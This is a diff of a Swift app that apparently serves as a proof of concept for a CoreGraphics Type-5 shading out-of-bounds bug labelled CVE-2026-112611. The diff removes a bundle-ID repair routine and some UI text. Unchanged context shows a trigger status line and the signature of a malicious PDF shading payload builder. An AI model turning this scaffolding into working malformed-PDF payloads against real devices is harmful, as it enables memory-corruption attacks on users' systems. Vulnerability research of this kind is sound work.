@@ -2,56 +2,8 @@ import SwiftUI
 import CoreGraphics
 import Foundation
 
-// MARK: - Runtime Bundle ID Fix (runs before main)
-// Prevents CFBundleGetMainBundle crash from corrupted bundle ID
-
-func fixBundleID() {
-    // Get main bundle path
-    guard let bundlePath = Bundle.main.bundlePath as String? else { return }
-    let plistPath = (bundlePath as NSString).appendingPathComponent("Info.plist")
-    
-    // Read current plist
-    guard let plistData = FileManager.default.contents(atPath: plistPath) else { return }
-    
-    // Parse plist
-    guard var plist = try? PropertyListSerialization.propertyList(from: plistData, options: [], format: nil) as? [String: Any] else { return }
-    
-    // Get current bundle ID
-    let currentID = plist["CFBundleIdentifier"] as? String ?? "unknown"
-    
-    // Fix if corrupted (has team ID suffix or wrong type)
-    if currentID.contains(".8SWJXLX2V6") || currentID.contains(".1.") {
-        plist["CFBundleIdentifier"] = "com.jasonquiles.SafeShadingDemo"
-        
-        // Also fix CFBundleExecutable if needed
-        if let exec = plist["CFBundleExecutable"], !(exec is String) {
-            plist["CFBundleExecutable"] = "SafeShadingDemo"
-        }
-        
-        // Fix version strings if they're numbers
-        for key in ["CFBundleVersion", "CFBundleShortVersionString"] {
-            if let val = plist[key], !(val is String) {
-                plist[key] = String(describing: val)
-            }
-        }
-        
-        // Write back
-        if let newData = try? PropertyListSerialization.data(fromPropertyList: plist, format: .binary, options: 0) {
-            try? newData.write(to: URL(fileURLWithPath: plistPath))
-        }
-    }
-}
-
-// Call fix immediately on load
-fixBundleID()
-
-// MARK: - App Entry Point
 @main
 struct SafeShadingDemoApp: App {
-    init() {
-        // Bundle ID already fixed above
-    }
-    
     var body: some Scene {
         WindowGroup {
             ContentView()
@@ -59,7 +11,6 @@ struct SafeShadingDemoApp: App {
     }
 }
 
-// MARK: - Content View
 struct ContentView: View {
     @State private var status = "Ready to trigger CVE-2026-112611"
     @State private var isTriggering = false
@@ -72,10 +23,6 @@ struct ContentView: View {
             
             Text("CoreGraphics Type-5 Shading OOB")
                 .font(.headline)
-            
-            Text("Bundle: \(Bundle.main.bundleIdentifier ?? "unknown")")
-                .font(.caption)
-                .foregroundColor(.secondary)
             
             Text(status)
                 .font(.system(.body, design: .monospaced))
@@ -157,7 +104,6 @@ struct ContentView: View {
     }
 }
 
-// MARK: - PDF Payload Builder
 enum PDFPayload {
     static func shading(rangeDim: Int, value: Double = 1.0, verticesPerRow: Int = 2, rows: Int = 2) -> Data {
         let bpCoord = 32
